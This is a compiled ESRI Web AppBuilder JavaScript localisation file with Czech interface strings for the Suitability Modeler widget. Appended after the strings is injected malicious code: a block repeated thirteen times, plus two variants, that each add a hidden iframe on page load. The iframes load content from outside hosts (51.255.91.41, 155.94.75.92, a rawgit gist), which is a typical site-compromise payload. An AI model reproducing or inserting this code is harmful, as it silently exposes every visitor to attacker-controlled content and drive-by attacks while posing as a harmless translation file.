// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Modeler vhodnosti",general:{clear:"Vymazat",cancel:"Storno",save:"Spustit",saveAs:"Exportovat"},saveModel:{save:"Exportovat",title:"Nadpis: ",summary:"Shrnut\u00ed: ",description:"Popis: ",tags:"Kl\u00ed\u010dov\u00e1 slova: ",folder:"Slo\u017eka: ",homeFolderPattern:"{username} (domovsk\u00e1 str\u00e1nka)",failed:"Export se nezda\u0159il."},util:{colorRamp:{1:"Extr\u00e9mn\u011b n\u00edzk\u00e1",2:"Velmi n\u00edzk\u00e1",3:"N\u00edzk\u00e1",
4:"N\u00edzk\u00e1 st\u0159edn\u00ed",5:"St\u0159edn\u00ed",6:"Vysok\u00e1 st\u0159edn\u00ed",7:"Vysok\u00e1",8:"Velmi vysok\u00e1",9:"Extr\u00e9mn\u011b vysok\u00e1",low:"N\u00edzk\u00e1",high:"Vysok\u00e1",tipPattern:"{label} ({value})",flipCaption:"P\u0159evr\u00e1tit"}},wro:{caption:"Modeler vhodnosti",browsePrompt:"Slu\u017eba v\u00e1\u017een\u00e9ho p\u0159ekryvu",selectLayersCaption:"Vybrat vrstvy",selectLayers:"Vrstvy",designModelCaption:"Navrhnout model",designModel:"Navrhnout model",transparency:"Pr\u016fhlednost",
visible:"Viditeln\u00e9",total:"Souhrn",unableToLoad:"Nelze na\u010d\u00edst model.",projectNotOpen:"Projekt nen\u00ed otev\u0159en.",readMore:"P\u0159e\u010dt\u011bte si v\u00edce",validation:{validating:"Ov\u011b\u0159ov\u00e1n\u00ed\u2026",invalidItemCaption:"Varov\u00e1n\u00ed slu\u017eby v\u00e1\u017een\u00e9ho p\u0159ekryvu",notAnImageService:"Tato polo\u017eka nen\u00ed obrazov\u00e1 slu\u017eba.",notAWroService:"Tato polo\u017eka nen\u00ed slu\u017eba v\u00e1\u017een\u00e9ho p\u0159ekryvu.",
undefinedUrl:"Adresa URL t\u00e9to polo\u017eky nen\u00ed definov\u00e1na.",inaccessible:"Slu\u017eba je nedostupn\u00e1.",generalError:"Nelze otev\u0159\u00edt polo\u017eku.",missingFieldPattern:"{field} je vy\u017eadovan\u00e9 pole",notAllowRasterFunction:"allowRasterFunction mus\u00ed b\u00fdt nastaveno na hodnotu true.",notNearestResampling:"defaultResamplingMethod mus\u00ed b\u00fdt nastaveno na hodnotu Nejbli\u017e\u0161\u00ed.",notIsWeightedOverlayProp:"Kl\u00ed\u010dov\u00e1 vlastnost IsWeightedOverlay mus\u00ed b\u00fdt nastavena na hodnotu true.",
invalidLink:"Adresa URL je neplatn\u00e1. Nepoda\u0159ilo se otev\u0159\u00edt web pro vybranou vrstvu.",unexpectedError:"Nastal neo\u010dek\u00e1van\u00fd stav.",rangeMessage:"Hodnota mus\u00ed b\u00fdt mezi ${0} a ${1}.",rangeMessage100:"Hodnota mus\u00ed b\u00fdt mezi 0 a 100.",maxLayers:"Slu\u017eba dovoluje maxim\u00e1ln\u011b ${0} vrstev, p\u0159ed p\u0159id\u00e1n\u00edm nov\u00e9 vrstvy nejprve mus\u00edte vrstvu odstranit.",notFound:"Vrstva ${0} nebyla nalezena ve slu\u017eb\u011b v\u00e1\u017een\u00e9ho p\u0159ekryvu.",
wroServiceNotDefined:"Pro model nen\u00ed definov\u00e1na \u017e\u00e1dn\u00e1 slu\u017eba v\u00e1\u017een\u00e9ho p\u0159ekryvu.",overlayLayerOutputInvalid:"V\u00fdstupn\u00ed hodnota rozsah\u016f p\u0159emapov\u00e1n\u00ed [${1}] vrstvy p\u0159ekryvu [${0}] chyb\u00ed nebo je neplatn\u00e1.",overlayLayerInputInvalid:"Vstupn\u00ed minimum/maximum rozsah\u016f p\u0159emapov\u00e1n\u00ed [${1}] vrstvy p\u0159ekryvu [${0}] chyb\u00ed nebo je neplatn\u00e9.",overlayLayerRangesMissing:"Ve vrstv\u011b p\u0159ekryvu [${0}] chyb\u00ed rozsahy p\u0159emapov\u00e1n\u00ed.",
overlayLayerWeight:"V\u00e1hy vrstvy p\u0159ekryvu mus\u00ed dohromady d\u00e1vat 100.",overlayLayerRequired:"Je vy\u017eadov\u00e1na alespo\u0148 jedna vrstva p\u0159ekryvu.",overlayLayerNotDefined:"Vrstvy p\u0159ekryvu nejsou definov\u00e1ny.",requiresColormap:"Tato rastrov\u00e1 funkce vy\u017eaduje mapu barev, ale model nem\u00e1 platnou definici mapy barev.",createModelError:"P\u0159i vytv\u00e1\u0159en\u00ed modelu do\u0161lo k\u00a0chyb\u011b.",invalidModel:"Model je neplatn\u00fd.",imageServiceNotDefined:"Vrstva obrazov\u00e9 slu\u017eby nen\u00ed definov\u00e1na.",
imageLayerNotDefined:"Vrstva obrazov\u00e9 slu\u017eby nen\u00ed definov\u00e1na.",histogramNotDefined:"Nen\u00ed definov\u00e1na \u017e\u00e1dn\u00e1 funkce histogramu v\u00e1\u017een\u00e9ho p\u0159ekryvu."},colorRampLabel:{"Green Yellow Red":"Zelen\u00e1 \u017elut\u00e1 \u010derven\u00e1","Red Yellow Green":"\u010cerven\u00e1 \u017elut\u00e1 zelen\u00e1","Yellow to Dark Red":"\u017dlut\u00e1 a\u017e tmav\u011b \u010derven\u00e1","Dark Red to Yellow":"Tmav\u011b \u010derven\u00e1 a\u017e \u017elut\u00e1",
"Light Gray to Dark Gray":"Sv\u011btle \u0161ed\u00e1 a\u017e tmav\u011b \u0161ed\u00e1","Dark Gray to Light Gray":"Tmav\u011b \u0161ed\u00e1 a\u017e sv\u011btle \u0161ed\u00e1","Light Brown to Dark Brown":"Sv\u011btle hn\u011bd\u00e1 a\u017e tmav\u011b hn\u011bd\u00e1","Dark Brown to Light Brown":"Tmav\u011b hn\u011bd\u00e1 a\u017e sv\u011btle hn\u011bd\u00e1","Full Spectrum - Bright Red to Blue":"Pln\u00e9 spektrum \u2013 sv\u011btle \u010derven\u00e1 a\u017e modr\u00e1","Full Spectrum - Bright Blue to Red":"Pln\u00e9 spektrum \u2013 sv\u011btle modr\u00e1 a\u017e \u010derven\u00e1",
"Partial Spectrum - Yellow to Blue":"\u010c\u00e1ste\u010dn\u00e9 spektrum \u2013 \u017elut\u00e1 a\u017e modr\u00e1","Partial Spectrum - Blue to Yellow":"\u010c\u00e1ste\u010dn\u00e9 spektrum \u2013 modr\u00e1 a\u017e \u017elut\u00e1","Yellow-Green to Dark Blue":"\u017dlutozelen\u00e1 a\u017e tmav\u011b modr\u00e1","Dark Blue to Yellow-Green":"Tmav\u011b modr\u00e1 a\u017e \u017elutozelen\u00e1","Cold to Hot Diverging":"Studen\u00e9 a\u017e tepl\u00e9 barvy, divergentn\u00ed","Hot to Cold Diverging":"Tepl\u00e9 a\u017e studen\u00e9 barvy, divergentn\u00ed",
"Surface - Low to High":"Povrch \u2013 n\u00edzk\u00fd a\u017e vysok\u00fd","Surface - High to Low":"Povrch \u2013 vysok\u00fd a\u017e n\u00edzk\u00fd"}},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});